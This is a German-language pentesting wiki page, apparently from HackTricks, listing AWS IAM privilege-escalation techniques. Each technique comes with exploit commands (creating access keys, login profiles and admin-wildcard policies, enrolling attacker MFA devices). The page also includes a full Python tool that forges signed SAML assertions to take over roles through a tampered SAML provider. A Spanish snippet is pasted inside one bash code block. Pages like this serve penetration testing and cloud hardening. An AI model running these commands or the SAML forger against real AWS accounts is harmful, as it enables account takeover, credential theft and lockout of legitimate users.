# AWS - IAM Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## IAM

Für weitere Informationen zu IAM siehe:

{{#ref}}
../../aws-services/aws-iam-enum.md
{{#endref}}

### **`iam:CreatePolicyVersion`**

Ermöglicht das Erstellen einer neuen IAM-Policy-Version und umgeht die Notwendigkeit der Berechtigung `iam:SetDefaultPolicyVersion`, indem das Flag `--set-as-default` verwendet wird. Dadurch können benutzerdefinierte Berechtigungen definiert werden.

**Exploit Command:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**Auswirkung:** Erhöht direkt die Privilegien, indem es jede Aktion auf jeder Ressource erlaubt.

### **`iam:SetDefaultPolicyVersion`**

Ermöglicht das Ändern der Standardversion einer IAM Policy auf eine andere vorhandene Version und kann potenziell zu einer Privilegieneskalation führen, wenn die neue Version mehr Berechtigungen enthält.

**Bash-Befehl:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**Impact:** Indirekte privilege escalation durch das Ermöglichen zusätzlicher Berechtigungen.

### **`iam:CreateAccessKey`, (`iam:DeleteAccessKey`)**

Ermöglicht das Erstellen eines access key ID und eines secret access key für einen anderen Benutzer, was zu potenzieller privilege escalation führen kann.

**Exploit:**
```bash
aws iam create-access-key --user-name <target_user>
```
**Impact:** Direkte Privilegieneskalation durch das Annehmen der erweiterten Berechtigungen eines anderen Benutzers.

Beachte, dass ein Benutzer nur 2 access keys erstellen kann, daher benötigst du, falls ein Benutzer bereits 2 access keys hat, die Berechtigung `iam:DeleteAccessKey`, um einen davon zu löschen, damit du einen neuen erstellen kannst:
```bash
aws iam delete-access-key --uaccess-key-id <key_id>
```
### **`iam:CreateVirtualMFADevice` + `iam:EnableMFADevice`**

Wenn du ein neues virtuelles MFA-Gerät erstellen und es bei einem anderen Benutzer aktivieren kannst, kannst du effektiv deine eigene MFA für diesen Benutzer registrieren und dann eine MFA-gestützte Sitzung für dessen Anmeldeinformationen anfordern.

**Exploit:**
```bash
# Create a virtual MFA device (this returns the serial and the base32 seed)
aws iam create-virtual-mfa-device --virtual-mfa-device-name <mfa_name>

# Generate 2 consecutive TOTP codes from the seed, then enable it for the user
aws iam enable-mfa-device --user-name <target_user> --serial-number <serial> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Auswirkung:** Direkte Privilegieneskalation durch Übernahme der MFA-Registrierung eines Benutzers (und anschließende Nutzung seiner Berechtigungen).

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

Erlaubt das Erstellen oder Aktualisieren eines Anmeldeprofils, einschließlich des Setzens von Passwörtern für die AWS Console-Anmeldung, was zu direkter Privilegieneskalation führt.

**Exploit zur Erstellung:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Exploit für Update:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**Auswirkung:** Direkte Privilegieneskalation durch Anmeldung als "beliebiger" Benutzer.

### **`iam:UpdateAccessKey`**

Ermöglicht das Reaktivieren eines deaktivierten Access Keys, was möglicherweise zu unautorisiertem Zugriff führt, wenn ein Angreifer den deaktivierten Key besitzt.

**Exploit:**
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
**Auswirkung:** Direkte Privilegieneskalation durch Reaktivierung von access keys.

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

Ermöglicht das Erzeugen oder Zurücksetzen von Zugangsdaten für spezifische AWS-Services (am häufigsten **CodeCommit**). Dies sind **keine** AWS API keys: es sind **username/password** Zugangsdaten für einen bestimmten Dienst, und man kann sie nur dort verwenden, wo der Dienst sie akzeptiert.

**Erstellung:**
```bash
aws iam create-service-specific-credential --user-name <target_user> --service-name codecommit.amazonaws.com
```
Speichere:

- `ServiceSpecificCredential.ServiceUserName`
- `ServiceSpecificCredential.ServicePassword`

**Beispiel:**
```bash
# Find a repository you can access as the target
aws codecommit list-repositories

export REPO_NAME="<repo_name>"
export AWS_REGION="us-east-1" # adjust if needed

# Git URL (HTTPS)
export CLONE_URL="https://git-codecommit.${AWS_REGION}.amazonaws.com/v1/repos/${REPO_NAME}"

# Clone and use the ServiceUserName/ServicePassword when prompted
git clone "$CLONE_URL"
cd "$REPO_NAME"
```
> Hinweis: Das Service-Passwort enthält oft Zeichen wie `+`, `/` und `=`. Die Verwendung des interaktiven Prompts ist normalerweise am einfachsten. Wenn Sie es in eine URL einbetten, URL-kodieren Sie es zuerst.

An diesem Punkt können Sie alles lesen, auf das der Zielbenutzer in CodeCommit zugreifen kann (z. B. a leaked credentials file). Wenn Sie **AWS access keys** aus dem Repo abrufen, konfigurieren Sie ein neues AWS CLI-Profil mit diesen Schlüsseln und greifen Sie dann auf Ressourcen zu (zum Beispiel eine flag aus Secrets Manager lesen):
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> --profile <new_profile>
```
**Zurücksetzen:**
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
**Impact:** Privilege escalation in die Berechtigungen des Zielbenutzers für den jeweiligen Service (und möglicherweise darüber hinaus, wenn ein pivot mit Daten aus diesem Service durchgeführt wird).

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

Ermöglicht das Anhängen von Policies an Benutzer oder Gruppen und führt so zu einer direkten Privilege escalation, indem die Berechtigungen der angehängten Policy übernommen werden.

**Exploit for User:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit für Gruppe:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**Auswirkung:** Direkte privilege escalation zu allem, was die Richtlinie gewährt.

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

Ermöglicht das Anhängen oder Hinzufügen von Richtlinien an Rollen, Benutzer oder Gruppen und ermöglicht direkte privilege escalation durch das Gewähren zusätzlicher Berechtigungen.

**Exploit for Role:**
```bash
aws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**Exploit für Inline Policies:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
Sie können eine Richtlinie wie folgt verwenden:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}
```
**Impact:** Direkte Privilegieneskalation durch Hinzufügen von Berechtigungen über Richtlinien.

### **`iam:AddUserToGroup`**

Ermöglicht es, sich selbst zu einer IAM-Gruppe hinzuzufügen und dadurch Privilegien zu eskalieren, indem man die Berechtigungen der Gruppe übernimmt.

**Exploit:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
**Auswirkung:** Direkte Privilegieneskalation auf das Niveau der Berechtigungen der Gruppe.

### **`iam:UpdateAssumeRolePolicy`**

Erlaubt das Ändern des assume role policy‑Dokuments einer Rolle und dadurch das Annehmen der Rolle sowie das Erlangen ihrer zugehörigen Berechtigungen.

**Exploit:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
Wenn die Policy wie folgt aussieht, die dem Benutzer die Berechtigung gibt, die Rolle zu übernehmen:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**Impact:** Direkte Privilegieneskalation durch das Annehmen der Berechtigungen beliebiger Rollen.

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

Ermöglicht das Hochladen eines SSH-öffentlichen Schlüssels zur Authentifizierung bei CodeCommit und das Deaktivieren von MFA-Geräten, was zu einer möglichen indirekten Privilegieneskalation führen kann.

**Exploit für SSH Key Upload:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**Exploit für MFA Deactivation:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**Auswirkung:** Indirekte privilege escalation durch Aktivierung des CodeCommit-Zugriffs oder Deaktivierung des MFA-Schutzes.

### **`iam:ResyncMFADevice`**

Ermöglicht die Resynchronisierung eines MFA-Geräts, was potenziell zu einer indirekten privilege escalation führen kann, indem der MFA-Schutz manipuliert wird.

**Bash Command:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**Impact:** Indirekte Privilegieneskalation durch Hinzufügen oder Manipulieren von MFA-Geräten.

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

Mit diesen Berechtigungen können Sie **die XML-Metadaten der SAML-Verbindung ändern**. Dann könnten Sie die **SAML federation** missbrauchen, um sich mit jeder **role, die ihr vertraut**, einzuloggen.

Beachte, dass dabei **legitime Benutzer sich nicht einloggen können**. Sie könnten jedoch das XML erhalten, Ihr eigenes einsetzen, sich einloggen und die vorherige Konfiguration wiederherstellen.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
**End-to-End-Angriff:**

1. Den SAML-Provider und eine Rolle, die ihm vertraut, aufzählen:
```bash
export AWS_REGION=${AWS_REGION:-us-east-1}

aws iam list-saml-providers
export PROVIDER_ARN="arn:aws:iam::<ACCOUNT_ID>:saml-provider/<PROVIDER_NAME>"

# Backup current metadata so you can restore it later:
aws iam get-saml-provider --saml-provider-arn "$PROVIDER_ARN" > /tmp/saml-provider-backup.json

# Find candidate roles and inspect their trust policy to confirm they allow sts:AssumeRoleWithSAML:
aws iam list-roles | grep -i saml || true
aws iam get-role --role-name "<ROLE_NAME>"
export ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```
2. Fälsche IdP-Metadaten + eine signierte SAML-Assertion für das Rolle/Provider-Paar:
```bash
python3 -m venv /tmp/saml-federation-venv
source /tmp/saml-federation-venv/bin/activate
pip install lxml signxml

# Create /tmp/saml_forge.py from the expandable below first:
python3 /tmp/saml_forge.py --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" > /tmp/saml-forge.json
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-forge.json","r"))
open("/tmp/saml-metadata.xml","w").write(j["metadata_xml"])
open("/tmp/saml-assertion.b64","w").write(j["assertion_b64"])
print("Wrote /tmp/saml-metadata.xml and /tmp/saml-assertion.b64")
PY
```
<details>
<summary>Ausklappbar: <code>/tmp/saml_forge.py</code> Hilfsprogramm (Metadaten + signierte Assertion)</summary>
```python
#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import subprocess
import tempfile
import uuid

from lxml import etree
from signxml import XMLSigner, methods


def _run(cmd: list[str]) -> str:
p = subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
return p.stdout


def _openssl_make_key_and_cert(tmpdir: str) -> tuple[str, str]:
key_path = os.path.join(tmpdir, "key.pem")
cert_path = os.path.join(tmpdir, "cert.pem")
_run(
[
"openssl",
"req",
"-x509",
"-newkey",
"rsa:2048",
"-keyout",
key_path,
"-out",
cert_path,
"-days",
"3650",
"-nodes",
"-subj",
"/CN=attacker-idp",
]
)
return key_path, cert_path


def _pem_cert_to_b64(cert_pem: str) -> str:
lines: list[str] = []
for line in cert_pem.splitlines():
if "BEGIN CERTIFICATE" in line or "END CERTIFICATE" in line:
continue
line = line.strip()
if line:
lines.append(line)
return "".join(lines)


def make_metadata_xml(cert_b64: str) -> str:
return f"""<?xml version="1.0"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://attacker.invalid/idp">
<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<KeyDescriptor use="signing">
<KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
<X509Data>
<X509Certificate>{cert_b64}</X509Certificate>
</X509Data>
</KeyInfo>
</KeyDescriptor>
<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://attacker.invalid/sso"/>
</IDPSSODescriptor>
</EntityDescriptor>
"""


def make_signed_saml_response(role_arn: str, principal_arn: str, key_pem: str, cert_pem: str) -> bytes:
ns = {
"saml2p": "urn:oasis:names:tc:SAML:2.0:protocol",
"saml2": "urn:oasis:names:tc:SAML:2.0:assertion",
}

issue_instant = dt.datetime.now(dt.timezone.utc)
not_before = issue_instant - dt.timedelta(minutes=2)
not_on_or_after = issue_instant + dt.timedelta(minutes=10)

resp_id = "_" + str(uuid.uuid4())
assertion_id = "_" + str(uuid.uuid4())

response = etree.Element(etree.QName(ns["saml2p"], "Response"), nsmap=ns)
response.set("ID", resp_id)
response.set("Version", "2.0")
response.set("IssueInstant", issue_instant.isoformat())
response.set("Destination", "https://signin.aws.amazon.com/saml")

issuer = etree.SubElement(response, etree.QName(ns["saml2"], "Issuer"))
issuer.text = "https://attacker.invalid/idp"

status = etree.SubElement(response, etree.QName(ns["saml2p"], "Status"))
status_code = etree.SubElement(status, etree.QName(ns["saml2p"], "StatusCode"))
status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

assertion = etree.SubElement(response, etree.QName(ns["saml2"], "Assertion"))
assertion.set("ID", assertion_id)
assertion.set("Version", "2.0")
assertion.set("IssueInstant", issue_instant.isoformat())

a_issuer = etree.SubElement(assertion, etree.QName(ns["saml2"], "Issuer"))
a_issuer.text = "https://attacker.invalid/idp"

subject = etree.SubElement(assertion, etree.QName(ns["saml2"], "Subject"))
name_id = etree.SubElement(subject, etree.QName(ns["saml2"], "NameID"))
name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified")
name_id.text = "attacker"

subject_conf = etree.SubElement(subject, etree.QName(ns["saml2"], "SubjectConfirmation"))
subject_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
subject_conf_data = etree.SubElement(subject_conf, etree.QName(ns["saml2"], "SubjectConfirmationData"))
subject_conf_data.set("NotOnOrAfter", not_on_or_after.isoformat())
subject_conf_data.set("Recipient", "https://signin.aws.amazon.com/saml")

conditions = etree.SubElement(assertion, etree.QName(ns["saml2"], "Conditions"))
conditions.set("NotBefore", not_before.isoformat())
conditions.set("NotOnOrAfter", not_on_or_after.isoformat())

audience_restriction = etree.SubElement(conditions, etree.QName(ns["saml2"], "AudienceRestriction"))
audience = etree.SubElement(audience_restriction, etree.QName(ns["saml2"], "Audience"))
audience.text = "https://signin.aws.amazon.com/saml"

attr_stmt = etree.SubElement(assertion, etree.QName(ns["saml2"], "AttributeStatement"))

attr_role = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_role.set("Name", "https://aws.amazon.com/SAML/Attributes/Role")
attr_role_value = etree.SubElement(attr_role, etree.QName(ns["saml2"], "AttributeValue"))
attr_role_value.text = f"{role_arn},{principal_arn}"

attr_session = etree.SubElement(attr_stmt, etree.QName(ns["saml2"], "Attribute"))
attr_session.set("Name", "https://aws.amazon.com/SAML/Attributes/RoleSessionName")
attr_session_value = etree.SubElement(attr_session, etree.QName(ns["saml2"], "AttributeValue"))
attr_session_value.text = "saml-session"

key_bytes = open(key_pem, "rb").read()
cert_bytes = open(cert_pem, "rb").read()

signer = XMLSigner(
method=methods.enveloped,
signature_algorithm="rsa-sha256",
digest_algorithm="sha256",
c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
)
signed_assertion = signer.sign(
assertion,
key=key_bytes,
cert=cert_bytes,
reference_uri=f"#{assertion_id}",
id_attribute="ID",
)

response.remove(assertion)
response.append(signed_assertion)

return etree.tostring(response, xml_declaration=True, encoding="utf-8")


def main() -> None:
ap = argparse.ArgumentParser()
ap.add_argument("--role-arn", required=True)
ap.add_argument("--principal-arn", required=True)
args = ap.parse_args()

with tempfile.TemporaryDirectory() as tmp:
key_path, cert_path = _openssl_make_key_and_cert(tmp)
cert_pem = open(cert_path, "r", encoding="utf-8").read()
cert_b64 = _pem_cert_to_b64(cert_pem)

metadata_xml = make_metadata_xml(cert_b64)
saml_xml = make_signed_saml_response(args.role_arn, args.principal_arn, key_path, cert_path)
saml_b64 = base64.b64encode(saml_xml).decode("ascii")

print(json.dumps({"metadata_xml": metadata_xml, "assertion_b64": saml_b64}))


if __name__ == "__main__":
main()
```
</details>

3. Aktualisiere die SAML-Provider-Metadaten mit deinem IdP-Zertifikat, übernimm die Rolle und verwende die zurückgegebenen STS-Anmeldeinformationen:
```bash
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata.xml

# Assertion is base64 and can be long. Keep it on one line:
ASSERTION_B64=$(tr -d '\n' </tmp/saml-assertion.b64)
SESSION_LINE=$(aws sts assume-role-with-saml --role-arn "$ROLE_ARN" --principal-arn "$PROVIDER_ARN" --saml-assertion "$ASSERTION_B64" \
--query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken,Expiration]' --output text)
IFS=$'\t' read -r SESSION_AK SESSION_SK SESSION_ST SESSION_EXP <<<"$SESSION_LINE"
echo "Session expires at: $SESSION_EXP"

# Use creds inline (no need to create an AWS CLI profile):
AWS_ACCESS_KEY_ID="$SESSION_AK" AWS_SECRET_ACCESS_KEY="$SESSION_SK" AWS_SESSION_TOKEN="$SESSION_ST" AWS_REGION="$AWS_REGION" \
aws sts get-caller-identity
```
4. Aufräumen: vorherige Metadaten wiederherstellen:
```bash
python3 - <<'PY'
import json
j=json.load(open("/tmp/saml-provider-backup.json","r"))
open("/tmp/saml-metadata-original.xml","w").write(j["SAMLMetadataDocument"])
PY
aws iam update-saml-provider --saml-provider-arn "$PROVIDER_ARN" \
--saml-metadata-document file:///tmp/saml-metadata-original.xml
```
> [!WARNING]
> Das Aktualisieren der SAML-Provider-Metadaten ist störend: Solange Ihre Metadaten aktiv sind, können legitime SSO-Benutzer sich möglicherweise nicht authentifizieren.

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Unsicher) Wenn ein Angreifer diese **Berechtigungen** hat, könnte er einen neuen **Thumbprint** hinzufügen, um sich in alle Rollen einzuloggen, die dem Provider vertrauen.
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
### `iam:PutUserPermissionsBoundary`

Diese permission erlaubt einem Angreifer, die permissions boundary eines Benutzers zu aktualisieren und dadurch möglicherweise seine privileges zu eskalieren, indem er Aktionen ausführt, die normalerweise durch seine bestehenden permissions eingeschränkt sind.
```bash
aws iam put-user-permissions-boundary \
--user-name <nombre_usuario> \
--permissions-boundary arn:aws:iam::<cuenta>:policy/<nombre_politica>

Un ejemplo de una política que no aplica ninguna restricción es:


{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "BoundaryAllowAll",
"Effect": "Allow",
"Action": "*",
"Resource": "*"
}
]
}
```
### `iam:PutRolePermissionsBoundary`

Ein Akteur mit iam:PutRolePermissionsBoundary kann eine permissions boundary an einer bestehenden Rolle setzen. Das Risiko entsteht, wenn jemand mit dieser Berechtigung die Boundary einer Rolle ändert: Er kann Operationen unangemessen einschränken (was zu Dienstunterbrechungen führen kann) oder, wenn er eine permissive boundary anhängt, effektiv erweitern, was die Rolle tun kann, und dadurch Privilegien eskalieren.
```bash
aws iam put-role-permissions-boundary \
--role-name <Role_Name> \
--permissions-boundary arn:aws:iam::111122223333:policy/BoundaryPolicy
```
## Referenzen

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{{#include ../../../../banners/hacktricks-training.md}}
